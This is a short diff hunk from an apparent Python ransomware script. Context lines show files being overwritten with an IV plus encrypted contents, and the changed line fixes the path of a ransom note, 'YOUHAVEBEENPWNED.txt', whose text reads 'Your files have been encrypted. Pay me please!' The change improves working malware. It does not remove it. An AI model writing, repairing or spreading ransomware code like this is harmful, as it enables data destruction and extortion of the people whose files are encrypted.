@@ -189,5 +189,5 @@ for file in files:
     with open(file, "wb") as thefile:
         thefile.write(iv + contents_encrypted)
 
-with open(str(home_dir) + "YOUHAVEBEENPWNED.txt") as message:
+with open(str(home_dir) + "/YOUHAVEBEENPWNED.txt") as message:
     message.write("Your files have been encrypted. Pay me please!")
